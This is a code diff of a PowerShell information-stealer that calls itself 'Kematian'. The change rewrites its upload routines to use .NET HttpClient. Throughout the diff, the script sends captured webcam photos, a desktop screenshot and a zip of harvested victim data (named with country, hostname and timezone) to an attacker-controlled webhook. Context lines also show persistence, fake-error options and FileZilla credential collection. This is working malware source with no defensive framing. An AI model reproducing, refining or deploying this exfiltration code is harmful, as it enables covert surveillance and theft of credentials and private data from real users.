@@ -7,6 +7,7 @@ $fakeerror = $false
 $persistence = $true
 
 
+
 if ($debug) {
     $ProgressPreference = 'Continue'
 }
@@ -1097,21 +1098,47 @@ FileZilla: $filezilla_info
     $payload = $embed_and_body | ConvertTo-Json -Depth 10
     Invoke-WebRequest -Uri $webhook -Method POST -Body $payload -ContentType "application/json" -UseBasicParsing | Out-Null
 	
-    # send webcam
-    $items = Get-ChildItem -Path "$env:APPDATA\Kematian" -Filter out*.jpg
-    foreach ($item in $items) {
-        $name = $item.Name
-        curl.exe -F "payload_json={\`"username\`": \`"Kematian\`", \`"content\`": \`"## :camera: Webcam\n\n\`", \`"avatar_url\`": \`"$avatar\`"}" -F "file=@\`"$env:APPDATA\Kematian\$name\`"" $webhook | Out-Null
-        Remove-Item -Path "$env:APPDATA\Kematian\$name" -Force
-    }
+   # Send webcam
+   Add-Type -AssemblyName System.Net.Http
+   Add-Type -AssemblyName System.IO
+   $items = Get-ChildItem -Path "$env:APPDATA\Kematian" -Filter out*.jpg
+   foreach ($item in $items) {$name = $item.Name;Move-Item "$($item.FullName)" $folder_general -Force}
+   $jpegfiles = Get-ChildItem -Path $folder_general -Filter out*.jpg
+   foreach ($jpegfile in $jpegfiles) {
+   $name = $jpegfile.Name
+   $avatar = "https://i.imgur.com/DOIYOtp.gif"
+   $messageContent = @{content = "## :camera: Webcam" ;username = "Kematian" ;avatar_url = $avatar} | ConvertTo-Json;$httpClient = [Net.Http.HttpClient]::new()
+   $multipartContent = [Net.Http.MultipartFormDataContent]::new()
+   $messageBytes = [Text.Encoding]::UTF8.GetBytes($messageContent);$messageContentStream = [IO.MemoryStream]::new()
+   $messageContentStream.Write($messageBytes, 0, $messageBytes.Length);$messageContentStream.Position = 0;$streamContent = [Net.Http.StreamContent]::new($messageContentStream)
+   $streamContent.Headers.ContentType = [Net.Http.Headers.MediaTypeHeaderValue]::Parse("application/json");$multipartContent.Add($streamContent, "payload_json")
+   $fileStream = [IO.File]::OpenRead("$folder_general\$name");$fileContent = [Net.Http.StreamContent]::new($fileStream)
+   $fileContent.Headers.ContentType = [Net.Http.Headers.MediaTypeHeaderValue]::Parse("image/png");$multipartContent.Add($fileContent, "file", "$folder_general\$name")
+   $httpClient.PostAsync($webhook, $multipartContent).Result
+   }
 
-    # send screenshot
-    curl.exe -F "payload_json={\`"avatar_url\`":\`"$avatar\`",\`"username\`": \`"Kematian\`", \`"content\`": \`"## :desktop: Screenshot\n\n\`"}" -F "file=@\`"$folder_general\screenshot.png\`"" "$($webhook)" | Out-Null
+    # Send screenshot
+    $messageContent = @{content = "## :desktop: Screenshot";username = "Kematian" ;avatar_url = $avatar} | ConvertTo-Json
+    $httpClient = [Net.Http.HttpClient]::new()
+    $multipartContent = [Net.Http.MultipartFormDataContent]::new()
+    $messageBytes = [Text.Encoding]::UTF8.GetBytes($messageContent);$messageContentStream = [IO.MemoryStream]::new()
+    $messageContentStream.Write($messageBytes, 0, $messageBytes.Length);$messageContentStream.Position = 0
+    $streamContent = [Net.Http.StreamContent]::new($messageContentStream)
+    $streamContent.Headers.ContentType = [Net.Http.Headers.MediaTypeHeaderValue]::Parse("application/json")
+    $multipartContent.Add($streamContent, "payload_json");$fileStream = [IO.File]::OpenRead("$folder_general\screenshot.png")
+    $fileContent = [Net.Http.StreamContent]::new($fileStream);$fileContent.Headers.ContentType = [Net.Http.Headers.MediaTypeHeaderValue]::Parse("image/png")
+    $multipartContent.Add($fileContent, "file", "screenshot.png");$httpClient.PostAsync($webhook, $multipartContent).Result
 
+    # Send exfiltrated data
     $zipFileName = "$countrycode-($hostname)-($filedate)-($timezoneString).zip"
     $zipFilePath = "$env:LOCALAPPDATA\Temp\$zipFileName"
     Compress-Archive -Path "$folder_general" -DestinationPath "$zipFilePath" -Force
-    curl.exe -X POST -F 'payload_json={\"username\": \"Kematian\", \"content\": \"\", \"avatar_url\": \"https://i.imgur.com/6w6qWCB.jpeg\"}' -F "file=@$zipFilePath" $webhook | Out-Null
+    $messageContent = @{username = "Kematian" ;avatar_url = $avatar} | ConvertTo-Json
+    $httpClient = [Net.Http.HttpClient]::new();$multipartContent = [Net.Http.MultipartFormDataContent]::new();$messageBytes = [Text.Encoding]::UTF8.GetBytes($messageContent)
+    $messageContentStream = [IO.MemoryStream]::new();$messageContentStream.Write($messageBytes, 0, $messageBytes.Length);$messageContentStream.Position = 0
+    $streamContent = [Net.Http.StreamContent]::new($messageContentStream);$streamContent.Headers.ContentType = [Net.Http.Headers.MediaTypeHeaderValue]::Parse("application/json")
+    $multipartContent.Add($streamContent, "payload_json");$fileStream = [IO.File]::OpenRead($zipFilePath)
+    $fileContent = [Net.Http.StreamContent]::new($fileStream);$multipartContent.Add($fileContent, "file", $zipFilePath);$httpClient.PostAsync($webhook, $multipartContent).Result
     
     Write-Host "[!] The extracted data was sent successfully !" -ForegroundColor Green
     
